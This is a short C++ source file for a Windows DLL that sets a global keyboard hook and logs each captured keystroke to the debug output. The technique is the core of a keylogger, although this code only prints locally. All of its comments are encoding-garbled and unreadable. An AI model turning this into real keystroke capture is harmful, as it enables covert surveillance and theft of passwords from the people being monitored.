#include "stdafx.h"
#include "MessageHook.h"
#include "wchar.h"
#include "stdlib.h"
#include <windows.h>
extern HMODULE g_Module;
HHOOK g_Hook = 0;

//���ӻص�����
LRESULT CALLBACK KeyboardProc(
	_In_  int code,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
)
{
	// �ж��Ƿ�wParam��lParam���м�����Ϣ���ǵĻ���ִ�д�ӡ����
	if (code == HC_ACTION) {
		// ��256���������״̬������ָ���Ļ������У�����ɹ������
		BYTE KeyState[256] = { 0 };



		//���������洢
		if (GetKeyboardState(KeyState)) {
			// �õ���16�C23λ������������
			LONG  KeyInfo = lParam;
			UINT  keyCode = (KeyInfo >> 16) & 0x00ff;
			WCHAR wKeyCode = 0;
			ToAscii((UINT)wParam, keyCode, KeyState, (LPWORD)&wKeyCode, 0);
			// �����ӡ����
			WCHAR szInfo[512] = { 0 };
			swprintf_s(szInfo, _countof(szInfo), L"Hook--���̼�¼-->%c\n", (char)wKeyCode);
			//�����������debug��Ϣ��
			OutputDebugString(szInfo);
			return 0;
		}
	}
	return CallNextHookEx(g_Hook, code, wParam, lParam);
}

bool OnHook()
{
	if (g_Hook == 0)
	{
		g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Module, 0);
		return true;
	}
	return false;
}

bool UnHook()
{
	if (g_Hook != 0)
	{
		return UnhookWindowsHookEx(g_Hook);
	}
	return false;
}